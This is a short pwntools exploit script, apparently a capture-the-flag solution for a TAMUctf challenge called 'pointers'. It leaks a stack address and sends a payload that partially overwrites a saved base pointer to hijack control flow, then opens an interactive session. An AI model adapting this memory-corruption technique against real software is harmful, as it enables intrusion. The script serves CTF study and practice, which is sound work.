#!/usr/bin/python3

from pwn import *

exe = ELF('pointers', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*main+74

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote("tamuctf.com", 443, ssl=True, sni="pointers")
else:
    p = process(exe.path)

GDB()
p.recvuntil(b"at ")
stack = int(p.recv(14), 16)
info("stack: " + hex(stack))
rbp_addr = (stack + 0x28) & 0xffff
info("rbp_addr: " + hex(rbp_addr))
payload = b"a" * 8 + p16(rbp_addr)
sa(b"pls: ", payload)

p.interactive()
